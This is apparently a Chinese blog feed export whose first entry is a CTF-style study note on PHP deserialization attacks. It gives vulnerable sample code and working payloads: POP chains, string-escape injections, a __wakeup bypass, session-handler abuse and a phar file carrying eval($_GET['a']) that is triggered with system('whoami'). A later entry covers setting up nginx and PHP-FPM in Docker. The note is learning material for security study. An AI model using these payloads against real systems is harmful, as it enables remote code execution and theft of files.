&lt;?php// highlight_file(__FILE__);error_reporting(0);class index&#123;	private $test;	public function __construct()	&#123;		$this-&gt;test = new evil();	&#125;	// public function __destruct()	// &#123;	// 	$this-&gt;test-&gt;action();	// &#125;&#125;// class normal// &#123;// 	public function action()// 	&#123;// 		echo &quot;please attack me&quot;;// 	&#125;// &#125;class evil&#123;	var $test2 = &#x27;echo &quot;Hello World!&quot;;&#x27;;	// public function action()	// &#123;	// 	eval($this-&gt;test2);	// &#125;&#125;// unserialize($_GET[&#x27;test&#x27;]);echo urlencode(serialize(new index()));?&gt;

方法2:在类外进行赋值
&lt;?phphighlight_file(__FILE__);error_reporting(0);class index&#123;	public $test;//偷偷改成public，如果是private就只能用第一种方式&#125;class evil&#123;	var $test2;&#125;$a = new evil();$a-&gt;test2 = &#x27;system(&quot;ls&quot;)&#x27;;$b = new index();$b-&gt;test = $a;echo serialize($b);?&gt;

魔术方法触发规则触发前提：魔术方法所在的类或对象被调用
eg:
 &lt;?phphighlight_file(__FILE__);error_reporting(0);class fast &#123;    public $source;    public function __wakeup()&#123;        echo &quot;wakeup is here!!&quot;;        echo  $this-&gt;source;//如果要触发toString(),这里的source就得是sec的对象    &#125;&#125;class sec &#123;    var $benben;    public function __tostring()&#123;        echo &quot;tostring is here!!&quot;;    &#125;&#125;$b = $_GET[&#x27;benben&#x27;];unserialize($b);?&gt;

目标:显示tostring is here!!

//生成序列化字符串的url编码&lt;?phperror_reporting(0);class fast&#123;	public $source;&#125;class sec&#123;	var $benben;&#125;$a = new fast();$b = new sec();$a-&gt;source = $b;echo urlencode(serialize($a));//输出O%3A4%3A%22fast%22%3A1%3A%7Bs%3A6%3A%22source%22%3BO%3A3%3A%22sec%22%3A1%3A%7Bs%3A6%3A%22benben%22%3BN%3B%7D%7D?&gt;

构造url,?benben=O%3A4%3A%22fast%22%3A1%3A%7Bs%3A6%3A%22source%22%3BO%3A3%3A%22sec%22%3A1%3A%7Bs%3A6%3A%22benben%22%3BN%3B%7D%7D
先执行wakeup()再执行toString()
POP链构造与POC编写
eg:
 &lt;?php//flag is in flag.phphighlight_file(__FILE__);error_reporting(0);class Modifier &#123;    private $var;    public function append($value)    &#123;        include($value);        echo $flag;//1.目的要输出$flag    &#125;    public function __invoke()&#123;//2.触发__invoke()调用append()并把$var设置成flag.php        $this-&gt;append($this-&gt;var);    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __toString()&#123;        return $this-&gt;str-&gt;source;//4.如果把$str赋值为Test，Test中没有source成员，就会触发__get()    &#125;    public function __wakeup()&#123;//6.最终unserialize()触发__wakeup()        echo $this-&gt;source;//5.触发toString(),把自己作为变量赋值给$source    &#125;&#125;class Test&#123;    public $p;    public function __construct()&#123;        $this-&gt;p = array();    &#125;    public function __get($key)&#123;        $function = $this-&gt;p;        return $function();//3.如果把$p变成Modifier,调用__get()就会触发Modifier的__invoke()    &#125;&#125;if(isset($_GET[&#x27;pop&#x27;]))&#123;    unserialize($_GET[&#x27;pop&#x27;]);&#125;?&gt; 

第一步：触发invoke，使$var = &#39;flag.php&#39;
第二步：触发get，给$p赋值为对象Modifier
第三步：触发toString，给$str赋值为对象Test
第四步：触发wakeup，给source赋值为自己的对象
因为wakeup在Show中，所以我们构造序列化字符串中传递的参数就是Show
&lt;?php//flag is in flag.php// highlight_file(__FILE__);error_reporting(0);class Modifier &#123;    private $var = &#x27;flag.php&#x27;;//私有属性就不能在外赋值了&#125;class Show&#123;    public $source;    public $str;&#125;class Test&#123;    public $p;&#125;$a  = new Modifier();$b = new Show();$c = new Test();$b-&gt;source = $b;$b-&gt;str = $c;$c-&gt;p = $a;echo urlencode(serialize($b));?&gt; 

把url编码后的序列化字符串作为参数传入?pop=
得到flag：&#96;&#96; ctfstu&#123;5c202c62-7567-4fa0-a370-134fe9d16ce7&#125;

字符串逃逸利用str_replace()
/** * @param array|string $search 要被替换的 * @param array|string $replace 要替换的 * @param array|string $subject 替换的对象 * @return void */function str_replace(array|string $search, array|string $replace, array|string $subject);


反序列化时，属性长度不对，成员数量不对都无法进行序列化，会显示bool(false)
&lt;?phperror_reporting(0);class Test&#123;	public $a;	public $b;&#125;$a=new Test();// echo serialize($a);// $ser_str = &#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;N;&#125;&#x27;;$ser_str = &#x27;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;N;&#125;&#x27;;//成员数量不对var_dump(unserialize($ser_str));?&gt;&lt;!--bool(false)--&gt;&lt;?phperror_reporting(0);class Test&#123;	public $a;    public $b;&#125;$a=new Test();// echo serialize($a);// $ser_str = &#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;N;&#125;&#x27;;$ser_str = &#x27;O:4:&quot;Test&quot;:2:&#123;s:1111:&quot;a&quot;;N;s:1:&quot;b&quot;;N;&#125;&#x27;;//长度不对var_dump(unserialize($ser_str));?&gt;&lt;!--bool(false)--&gt;

如果反序列化时，忽略了某个存在的变量，序列化字符串中加上新的变量，最终反序列化结果会包含被忽略的变量和序列化字符串中的变量
&lt;?phperror_reporting(0);class Test&#123;	public $a;	public $b;&#125;$a=new Test();// echo serialize($a);// $ser_str = &#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;N;&#125;&#x27;;$ser_str = &#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;c&quot;;N;&#125;&#x27;;var_dump(unserialize($ser_str));?&gt;&lt;!--object(Test)#2 (3) &#123;  [&quot;a&quot;]=&gt;  NULL  [&quot;b&quot;]=&gt;  NULL  [&quot;c&quot;]=&gt;  NULL&#125;&gt;

为什么长度一定不能错?

/*反序列化结束符为;&#125;*/&lt;?phperror_reporting(0);class Test&#123;	public $a;	public $b;	public $c = &#x27;c&#x27;;&#125;$a = new Test();$ser_str = &#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;N;&#125;s:1:&quot;c&quot;;&quot;ccc&quot;;&#125;&#x27;;var_dump(unserialize($ser_str));/*object(Test)#2 (3) &#123;  [&quot;a&quot;]=&gt;  NULL  [&quot;b&quot;]=&gt;  NULL  [&quot;c&quot;]=&gt;  string(1) &quot;c&quot;&#125;*/?&gt;

减少
&lt;?phpclass Test&#123;	public $a;	public $b = &#x27;abcsystem&#x27;;	public $c;&#125;$str = serialize(new Test());/*$str = &#x27;O:4:&quot;Test&quot;:3:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;s:9:&quot;abcsystem&quot;;s:1:&quot;c&quot;;N;&#125;&#x27;*/$str = str_replace(&#x27;system&#x27;,&quot;&quot;,$str);/*$str = &#x27;O:4:&quot;Test&quot;:3:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;s:9:*/&quot;abc&quot;;s:1:&quot;&quot;/*&quot;c&quot;;N;&#125;&#x27;*/ //没注释的地方是会被当成$b的值的地方var_dump(unserialize($str));?&gt;



就是构造成员变量的值，在str_replace()的时候，能刚好吃掉不想要的，能够构造我们的命令
先把我们要执行的命令写好，这样便于构造长度
//eg&lt;?phpclass Test&#123;	public $a = &#x27;abcsystem&#x27;;	public $b = &#x27;构造的表达式&#x27;;&#125;$str = serialize(new Test());echo &quot;$str\n&quot;;&#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;abcsystem&quot;;s:1:&quot;b&quot;;s:?:&quot;构造的表达式&quot;;&#125;&#x27;;//要吃到构造的表达式所处的第一个&quot;?&gt;/*19个字符要3个system*/&lt;?phpclass Test&#123;	public $a = &#x27;abcsystemsystemsystem&#x27;;	public $b = &#x27;12&quot;;s:1:&quot;b&quot;;s:20:&quot;echo &quot;hello world!&quot;;&quot;;&#125;&#x27;;//用;&#125;直接截断&#125;$str = serialize(new Test());echo &quot;$str\n&quot;;&#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;s:21:&quot;abcsystemsystemsystem&quot;;s:1:&quot;b&quot;;s:37:&quot;s:1:&quot;b&quot;;s:20:&quot;echo &quot;hello world!&quot;;&quot;;&#125;&quot;;&#125;&#x27;;//截到构造的表达式前只有19个字符，还要再在构造的表达式前补上2个字符(21 - 19 = 2)和&quot;;$str = str_replace(&#x27;system&#x27;,&#x27;&#x27;,$str);$str = &#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;s:21:&quot;abc&quot;;s:1:&quot;b&quot;;s:37:&quot;12&quot;;s:1:&quot;b&quot;;s:20:&quot;echo &quot;hello world!&quot;;&quot;;&#125;&quot;;&#125;&#x27;;var_dump(unserialize($str));?&gt;  /*object(Test)#1 (2) &#123;  [&quot;a&quot;]=&gt;  string(21) &quot;abc&quot;;s:1:&quot;b&quot;;s:37:&quot;12&quot;  [&quot;b&quot;]=&gt;  string(20) &quot;echo &quot;hello world!&quot;;&quot;&#125;*/

例题&lt;?phperror_reporting(0);function filter($name)&#123;	$safe = array(&quot;flag&quot;, &quot;php&quot;);	$name = str_replace($safe, &quot;hk&quot;, $name);	return $name;&#125;class test&#123;	var $user;	var $pass;	var $vip = false;	function __construct($user, $pass)	&#123;		$this-&gt;user = $user;		$this-&gt;pass = $pass;	&#125;&#125;$param = $_GET[&#x27;user&#x27;];$pass = $_GET[&#x27;pass&#x27;];$param = serialize(new test($param, $pass));$profile = unserialize(filter($param));if ($profile-&gt;vip) &#123;	echo file_get_contents(&quot;flag.php&quot;);&#125;?&gt;

思路,三个属性,构造第一个属性,使它能吃掉剩下属性的值,在第二个属性中构造表达式使vip=true
&lt;?phpclass test&#123;	var $user = &quot;php&quot;;	var $pass = &quot;&quot;;	var $vip;&#125;echo serialize(new test());?&gt;//O:4:&quot;test&quot;:3:&#123;s:4:&quot;user&quot;;s:3:&quot;php&quot;;s:4:&quot;pass&quot;;s:0:&quot;&quot;;s:3:&quot;vip&quot;;N;&#125;/*从user值吃到pass值的前一个&quot;,需要18个字符(除去最开始的php),php经过filter变成hk减少一个字符,一共需要18个php才能正确吃完让$user = 18个php让$pass = &quot;;s:4:&quot;pass&quot;;N;s:3:&quot;vip&quot;;b:1;&#125;构造url,得到flag*/


增多
用str_replace(),替换成一个更长的字符串，把多余的字符吐出来
&lt;?phpclass Test&#123;	public $a = &#x27;a&#x27;;	public $b = &#x27;b&#x27;;&#125;$a = new Test();$str = serialize($a);//&#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;a&quot;;s:1:&quot;b&quot;;s:1:&quot;b&quot;;&#125;&#x27;;$str = str_replace(&#x27;a&#x27;,&#x27;aaa&#x27;,$str);// echo &quot;$str\n&quot;;/*&#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a*/aa/*&quot;;s:1:&quot;a&quot;;s:1:&quot;b&quot;;s:1:&quot;b&quot;;&#125;&#x27;;*/ //多出来的aa就是吐出的多余代码?&gt;

思路：把吐出来的多余代码构造成功能性代码
构造的字符串:&quot;;s:1:&quot;b&quot;:s:?:&quot;&quot;;&#125;   用;&#125;结束反序列化，不用管原功能性代码
构造的字符串长度为x，将ls替换成pwd会吐一个字符出来，需要x个pwd，这样就能吐x个字符出来，与前面长度正确对应，功能性代码被正确吐出

class Test&#123;	public $a = &#x27;ls&#x27;;	public $b = &#x27;b&#x27;;&#125;$a = new Test();echo serialize($a).&quot;\n&quot;;?&gt;/*想构造一个显示hello world,构造字符串&quot;;s:1:&quot;b&quot;;s:20:&quot;echo &quot;hello world!&quot;;&quot;;&#125; 长度为39将ls用pwd替换,吐出一个字符,所以我们需要39个ls,替换后才能吐出39个字符,让功能性代码正确吐出*/&lt;?phpclass Test&#123;	public $a = &#x27;lslslslslslslslslslslslslslslslslslslslslslslslslslslslslslslslslslslslslslsls&#x27;;//39个ls	public $b = &#x27;b&#x27;;&#125;$a = new Test();$hacker = &#x27;&quot;;s:1:&quot;b&quot;;s:20:&quot;echo &quot;hello world!&quot;;&quot;;&#125;&#x27;;$a-&gt;a = $a-&gt;a.$hacker;$str = serialize($a);echo &quot;$str\n&quot;;$str = str_replace(&#x27;ls&#x27;,&#x27;pwd&#x27;,$str);echo &quot;$str\n&quot;;// &#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;s:114:&quot;pwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwd&quot;;s:1:&quot;b&quot;;s:20:&quot;echo &quot;hello world!&quot;;&quot;;&quot;;s:1:&quot;b&quot;;s:1:&quot;b&quot;;&#125;&#x27;;var_dump(unserialize($str));?&gt;

例题&lt;?php// highlight_file(__FILE__);error_reporting(0);function filter($name)&#123;	$safe = array(&quot;flag&quot;, &quot;php&quot;);	$name = str_replace($safe, &quot;hack&quot;, $name);	return $name;&#125;class test&#123;	var $user;	var $pass = &#x27;daydream&#x27;;	function __construct($user)	&#123;		$this-&gt;user = $user;	&#125;&#125;$param = $_GET[&#x27;param&#x27;];$param = serialize(new test($param));$profile = unserialize(filter($param));if ($profile-&gt;pass == &#x27;escaping&#x27;) &#123;	echo file_get_contents(&quot;flag.php&quot;);&#125;?&gt;

目标:判断pass是否为escaping;用filter将php换成hack达到字符串增多
目标逃逸代码:&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;,29个字符,所以需要29个php
构造参数?param=phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp%22%3Bs%3A4%3A%22pass%22%3Bs%3A8%3A%22escaping%22%3B%7D
得到flag

wakeup魔术方法绕过
例题 &lt;?phperror_reporting(0);class secret&#123;    var $file=&#x27;index.php&#x27;;    public function __construct($file)&#123;        $this-&gt;file=$file;    &#125;    function __destruct()&#123;        include_once($this-&gt;file);        echo $flag;    &#125;    function __wakeup()&#123;        $this-&gt;file=&#x27;index.php&#x27;;    &#125;&#125;$cmd=$_GET[&#x27;cmd&#x27;];if (!isset($cmd))&#123;    highlight_file(__FILE__);&#125;else&#123;    if (preg_match(&#x27;/[oc]:\d+:/i&#x27;,$cmd))&#123;        echo &quot;Are you daydreaming?&quot;;    &#125;    else&#123;        unserialize($cmd);    &#125;&#125;//sercet in flag.php?&gt;

分析:要绕过__wakeup(),O:后面不能跟数字以绕过正则表达式
&lt;?phpclass secret&#123;	var $file = &#x27;flag.php&#x27;;&#125;echo serialize(new secret()).&quot;\n&quot;;//获取原序列化字符串echo urlencode(&#x27;O:+6:&quot;secret&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;&#x27;);//在数字前加上+绕过正则表达式,把属性数改大绕过wakeup?&gt;

拿到flag

引用php中引用为 &amp;
&lt;?phpclass Test&#123;	public $a;	public $b;&#125;$test = new Test();$test-&gt;a = &amp;$test-&gt;b; // a是b的引用echo serialize($test).&quot;\n&quot;;/*O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;R:2;&#125;*/?&gt;



例题&lt;?phphighlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);class just4fun &#123;    var $enter;    var $secret;&#125;if (isset($_GET[&#x27;pass&#x27;])) &#123;    $pass = $_GET[&#x27;pass&#x27;];    $pass=str_replace(&#x27;*&#x27;,&#x27;\*&#x27;,$pass);&#125;$o = unserialize($pass);if ($o) &#123;    $o-&gt;secret = &quot;*&quot;;    if ($o-&gt;secret === $o-&gt;enter)        echo &quot;Congratulation! Here is my secret: &quot;.$flag;    else        echo &quot;Oh no... You can&#x27;t fool me&quot;;&#125;else echo &quot;are you trolling?&quot;;?&gt;


这题中传入引用即可
&lt;?php// highlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);class just4fun &#123;    var $enter;    var $secret;&#125;$a = new just4fun();$a-&gt;enter = &amp;$a-&gt;secret;echo serialize($a);?&gt;


session反序列化漏洞一个页面写入session，一个页面读出session





例题no.1
//写入session &lt;?phphighlight_file(__FILE__);error_reporting(0);ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);session_start();$_SESSION[&#x27;ben&#x27;] = $_GET[&#x27;a&#x27;];?&gt; 

//读出session&lt;?php highlight_file(__FILE__);error_reporting(0);ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);session_start();class D&#123;    var $a;    function __destruct()&#123;        eval($this-&gt;a);//漏洞所在    &#125;&#125;?&gt; 

以php_serialize方式写入,以php方式读出,php方式键名|序列化字符串,所以构造参数时要加|
构造参数 ?a=|O:1:&quot;D&quot;:1:&#123;s:1:&quot;a&quot;;s:20:&quot;echo &quot;hello world!&quot;;&quot;;&#125;
no.2
//写入session &lt;?phphighlight_file(__FILE__);error_reporting(0);ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);session_start();$_SESSION[&#x27;a&#x27;] = $_GET[&#x27;a&#x27;];?&gt; 

//读出session&lt;?phphighlight_file(__FILE__);/*hint.php*/session_start();class Flag&#123;    public $name;    public $her;    function __wakeup()&#123;        $this-&gt;her=md5(rand(1, 10000));        if ($this-&gt;name===$this-&gt;her)&#123;            include(&#x27;flag.php&#x27;);            echo $flag;        &#125;    &#125;&#125;?&gt; 

分析:需要用到引用,以php_serialize方式写入session,php方式读出
构造参数?a=|O:4:&quot;Flag&quot;:2:&#123;s:4:&quot;name&quot;;N;s:3:&quot;her&quot;;R:2;&#125;;
phar反序列化漏洞

重点关注manifest这个字段
manifest字段格式

24byte后是序列化的字符串
漏洞原理
例题no.1
 &lt;?phphighlight_file(__FILE__);class Testobj&#123;    var $output=&#x27;&#x27;;&#125;@unlink(&#x27;test.phar&#x27;);   //删除之前的test.par文件(如果有)$phar=new Phar(&#x27;test.phar&#x27;);  //创建一个phar对象，文件名必须以phar为后缀$phar-&gt;startBuffering();  //开始写文件$phar-&gt;setStub(&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;);  //写入stub$o=new Testobj();$o-&gt;output=&#x27;eval($_GET[&quot;a&quot;]);&#x27;;$phar-&gt;setMetadata($o);//写入meta-data$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);  //添加要压缩的文件$phar-&gt;stopBuffering();?&gt; &lt;?phphighlight_file(__FILE__);error_reporting(0);class Testobj&#123;    var $output=&quot;echo &#x27;ok&#x27;;&quot;;    function __destruct()    &#123;        eval($this-&gt;output);    &#125;&#125;if(isset($_GET[&#x27;filename&#x27;]))&#123;    $filename=$_GET[&#x27;filename&#x27;];    var_dump(file_exists($filename));&#125;?&gt; 

分析:phar中manifest的值是对Testobj中$output=eval($_GET[&#39;a&#39;])进行序列化后得到的字符串,反序列化必然会调用__destruct(),相当于eval(eval($_GET[&#39;a&#39;])),执行了eval($_GET[&#39;a&#39;]),所以要传入两个参数,$filename处就可以传入phar伪协议参数,??filename=phar://test.phar&amp;a=system(&#39;whoami&#39;);
]]></content>
      <categories>
        <category>Web安全</category>
        <category>PHP反序列化</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Docker搭建Nginx以及PHP-fpm</title>
    <url>/2025/01/17/docker%E6%90%AD%E5%BB%BAnginx+php-fpm/</url>
    <content><![CDATA[前言想自己搭建靶场所以学习docker+nginx+php，但是这两天一直卡在配环境上，踩了许多的坑最终才完成环境的配置
参考了docker部署php和nginx环境_docker nginx php-CSDN博客
编辑文件如果不喜欢用vim，可以用vscode远程连接然后打开文件夹进行文件编辑等操作
参考：vscode连接远程服务器（傻瓜式教学）-CSDN博客
OS：centOS 7.9 64位
要点
最好是自己创建一个网络，把php容器和nginx容器都加入该网络中（做了这步就很神奇的可以解析php了）
自己创建目录结构尽量明了
nginx容器的根目录路径和php容器的根目录路径要挂载到同一目录
php.ini需要自己创建
挂载后根目录中要有index.html等默认页面，不然会报403（刚遇到让人一头雾水）
nginx的default.conf和nginx.conf一定要配置正确
有问题多看日志，多拿错误日志信息问问ai（

过程创建自己的网络docker network create mynet


 后续php容器，nginx容器加入该网络
创建辅助容器创建php和nginx两个容器，用于复制配置文件(仅仅用于辅助，我就没进行端口映射)
docker run -d --name nginx nginxdocker run -d --name php php:7.3-fpm



1.参数说明：-d 后台运行 –name 给容器取个名字


路径设置


使用docker cp命令：
将容器中路径的内容复制到docker host路径中
docker cp 容器名:路径 目的路径
nginx的配置文件位于&#x2F;etc&#x2F;nginx
nginx的日志文件位于&#x2F;var&#x2F;log
php配置文件位于&#x2F;usr&#x2F;local&#x2F;etc&#x2F;php

编辑

将nginx和php的配置文件复制到主机的&#x2F;data下，nginx的日志文件复制到&#x2F;data&#x2F;nginx

mkdir /datacd /data#nginxdocker cp nginx:/etc/nginx ./docker cp nginx:/var/log ./nginx



 用tree &#x2F;data看一下目录层级有没有正确
如果没有安装tree
yum install tree


编辑
复制php配置文件
编辑

进入php容器，可以用:
php -i | grep php.ini
得到配置文件路径
&#x2F;usr&#x2F;local&#x2F;etc&#x2F;php

#php (工作路径处于/data下)docker cp php:/usr/local/etc/php ./


做完以上操作后，目录层级结构如下：

编辑
做完这些，我们需要将php.ini-development或者php.ini-production中的其中一个改成php.ini
#工作路径/datamv ./php/php.ini-development ./php/php.ini


 修改后如下
编辑
然后我们需要有一个工作目录用来挂载初始页面目录,并且放一个index.html进去（不然到时候会403）
mkdir ./wwwtouch ./www/index.html


 目录层级如下
 编辑
删除辅助容器#加上-f就不用先停止容器docker rm -f $(docker ps -aq)


创建新容器nginx：docker run \-d --name nginx \-p 80:80 \-v /data/nginx/nginx.conf:/etc/nginx/nginx.conf \-v /data/nginx/conf.d/default.conf:/etc/nginx/conf.d/default.conf \-v /data/nginx/log:/var/log/nginx \-v /data/www:/usr/share/nginx/www \--network mynet \nginx



\1.    我新建了初始页面目录&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;www（原本的初始页面目录为&#x2F;usr&#x2F;share        &#x2F;nginx&#x2F;html）,将它挂载到我们创建好的工作目录&#x2F;data&#x2F;www下
\2.    配置文件一定要正确挂载
\3.    –network表示加入自己创建的网络mynet

php：docker run \-d --name php \-p 9000:9000 \-v /data/php/php.ini:/usr/local/etc/php/php.ini \-v /data/www:/usr/share/nginx/www \--network mynet \php:7.3-fpm



\1.    php和nginx的初始页面必须挂载到同一路径
​      所以在php和nginx的容器内都新建了&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;www
\2.    –network表示加入自己创建的网络mynet

修改配置文件修改default.conf#原本的default.confserver &#123;    listen       80;    listen  [::]:80;    server_name  localhost;    #access_log  /var/log/nginx/host.access.log  main;    location / &#123;        root   /usr/share/nginx/html;        index  index.html index.htm;    &#125;    #error_page  404              /404.html;    # redirect server error pages to the static page /50x.html    #    error_page   500 502 503 504  /50x.html;    location = /50x.html &#123;        root   /usr/share/nginx/html;    &#125;    # proxy the PHP scripts to Apache listening on 127.0.0.1:80    #    #location ~ \.php$ &#123;    #    proxy_pass   http://127.0.0.1;    #&#125;    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000    #    #location ~ \.php$ &#123;    #    root           html;    #    fastcgi_pass   127.0.0.1:9000;    #    fastcgi_index  index.php;    #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;    #    include        fastcgi_params;    #&#125;    # deny access to .htaccess files, if Apache&#x27;s document root    # concurs with nginx&#x27;s one    #    #location ~ /\.ht &#123;    #    deny  all;    #&#125;&#125;



我们需要更改：

将root改为之前设置的初始页面路径&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;www
在location \块中，index中增加index.php
将location ~ .php$块中的fastcgi_pass改成 php容器名:9000
fastcgi_param那一行改成：fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;


#修改后的default.confserver &#123;    listen       80;    listen  [::]:80;    server_name  localhost;    #access_log  /var/log/nginx/host.access.log  main;    root /usr/share/nginx/www;    location / &#123;        # root   /usr/share/nginx/html;        # index  index.html index.htm;        index index.php index.html;    &#125;    #error_page  404              /404.html;    # redirect server error pages to the static page /50x.html    #    error_page   500 502 503 504  /50x.html;    location = /50x.html &#123;        # root   /usr/share/nginx/html;    &#125;    # proxy the PHP scripts to Apache listening on 127.0.0.1:80    #    #location ~ \.php$ &#123;    #    proxy_pass   http://127.0.0.1;    #&#125;    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000    #    location ~ \.php$ &#123;    #    root           html;       fastcgi_pass   php:9000;       fastcgi_index  index.php;    #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;       include        fastcgi_params;    &#125;    # deny access to .htaccess files, if Apache&#x27;s document root    # concurs with nginx&#x27;s one    #    #location ~ /\.ht &#123;    #    deny  all;    #&#125;&#125;


修改nginx.conf在http块中把default.conf的内容复制进去
#nginx.confuser  nginx;worker_processes  auto;error_log  /var/log/nginx/error.log notice;pid        /var/run/nginx.pid;events &#123;    worker_connections  1024;&#125;http &#123;    include       /etc/nginx/mime.types;    default_type  application/octet-stream;    log_format  main  &#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;                      &#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;                      &#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;;    access_log  /var/log/nginx/access.log  main;    sendfile        on;    #tcp_nopush     on;    keepalive_timeout  65;    #gzip  on;    include /etc/nginx/conf.d/*.conf;    server &#123;    listen       80;    listen  [::]:80;    server_name  localhost;    #access_log  /var/log/nginx/host.access.log  main;    root /usr/share/nginx/www;    location / &#123;        # root   /usr/share/nginx/html;        # index  index.html index.htm;        index index.php index.html;        try_files $uri $uri/ /info.php?$query_string;    &#125;    #error_page  404              /404.html;    # redirect server error pages to the static page /50x.html    #    error_page   500 502 503 504  /50x.html;    location = /50x.html &#123;        # root   /usr/share/nginx/html;    &#125;    # proxy the PHP scripts to Apache listening on 127.0.0.1:80    #    #location ~ \.php$ &#123;    #    proxy_pass   http://127.0.0.1;    #&#125;    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000    #    location ~ \.php$ &#123;    #    root           html;       fastcgi_pass   php:9000;       fastcgi_index  index.php;    #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;        access_log /var/log/nginx/fastcgi.log main;        include        fastcgi_params;    &#125;    # deny access to .htaccess files, if Apache&#x27;s document root    # concurs with nginx&#x27;s one    #    #location ~ /\.ht &#123;    #    deny  all;    #&#125;&#125;&#125;


测试目录挂载与端口映射vscode打开&#x2F;data&#x2F;www&#x2F;index.html
随便写点html进去
&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;        &lt;title&gt;the nginx&#x27;s page made by my index.html!&lt;/title&gt;        &lt;style&gt;                html &#123;                        color-scheme: light dark;                &#125;                body &#123;                        width: 35em;                        margin: 0 auto;                        font-family: Tahoma, Verdana, Arial, sans-serif;                &#125;        &lt;/style&gt;&lt;/head&gt;&lt;body&gt;        &lt;h1&gt;the nginx&#x27;s page made by my index.html!&lt;/h1&gt;        &lt;p&gt;If you see this page, the nginx web server is successfully installed and                working. Further configuration is required.&lt;/p&gt;        &lt;p&gt;For online documentation and support please refer to                &lt;a href=&quot;http://bilibili.com/&quot;&gt;bilibili&lt;/a&gt;.&lt;br /&gt;                Commercial support is available at                &lt;a href=&quot;http://bilibili.com/&quot;&gt;bilibili.com&lt;/a&gt;.        &lt;/p&gt;        &lt;p&gt;&lt;em&gt;Thank you for using nginx.&lt;/em&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;


 编辑
若正常显示，证明目录挂载没有出错
如果遇到403，检查有没有进行端口映射或者工作目录下是不是没有index.html
检查php能否被解析创建index.php，写入
&lt;?php phpinfo();?&gt;



如果在浏览器中输入：
http:&#x2F;&#x2F;你的dockerhost的ip:nginx端口&#x2F;index.php

有以下结果
编辑
证明配置成功
出现的问题以及解决

nginx容器挂载目录前可以正常访问初始页面，但是进行目录挂载后就显示403：是**因为挂载的工作目录下没有index.html,**相当于挂载了一个空的目录给nginx容器，就无法访问了
环境及路径都配置好了，访问本机ip也能正常显示挂载的index.html，但是访问php文件出现直接把php文件下载下来或者显示File not found：先查看nginx的日志看一看有没有报错，然后检查default.conf和nginx.conf有没有错误，看一下location &#x2F;块下的index有没有加上index.php,如果容器使用自己创建的网络，配置文件的php块中的fastcgi_pass要写成**php容器名:映射的容器端口,**root设置为容器内的初始页面路径，astcgi_param那一行改成：fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;


最后因为在网上搜索了好多篇博客都未能彻底解决问题，所以才写了这篇博客用于记录自己的踩坑历程和用于日后参考；
因为是解决问题之后才写的博客，文中的命令也许会有差错，欢迎在评论区指正
写的不好，希望我的踩坑经历能够帮助到您，蟹蟹(｡･ω･｡)
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>Nginx</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>任意文件下载漏洞学习笔记</title>
    <url>/2024/10/14/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/</url>
    <content><![CDATA[前言本文是初学web安全时写的，有许多地方不够严谨，逻辑上也存在问题，请见谅~
参考：https://blog.csdn.net/qq_43531669/article/details/116865660
